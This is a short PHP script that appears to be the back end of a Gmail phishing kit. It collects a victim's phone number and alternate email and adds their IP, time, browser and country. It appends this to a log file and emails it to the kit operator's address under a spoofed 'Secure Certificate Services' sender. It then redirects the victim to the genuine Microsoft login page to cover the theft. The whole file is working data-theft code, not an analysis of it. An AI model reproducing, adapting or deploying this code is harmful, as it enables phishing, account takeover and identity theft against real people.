<?php

error_reporting(0);

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

$country = $_SESSION['country'];

$username = $_SESSION['username'];

if(isset($_SESSION['password_first']))  {

$password_first = $_SESSION['password_first'];

}

if(isset($_SESSION['password_second']))  {

$password_second = $_SESSION['password_second'];

}

if(!empty($_POST['alternate_email']))  {

$alternate_email = $_POST['alternate_email'];

}

if(!empty($_POST['phone_number']))  {

$phone_number = $_POST['phone_number'];

date_default_timezone_set('America/Chicago');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

require "../includes/my_email.php";

$msg .= "Gmail Info\n";

$msg .= "Phone Number: ".$phone_number."\n";
if(isset($alternate_email))  {
$msg .= "Alternate Email Address: ".$alternate_email."\n"; }
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "Country: $country\n";


$subject = "GBox $ip ";
$headers = "From: Secure Certificate Services <Noreply>\r\n";
$headers .= "Reply-To: Gmail Full Info <$my_email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$fp = fopen("../logs/gmail_full_details.txt", "a");
fputs($fp, $msg);
fclose($fp);

mail($my_email,$subject,$msg,$headers);

header("Location: https://login.microsoftonline.com/");

}

?>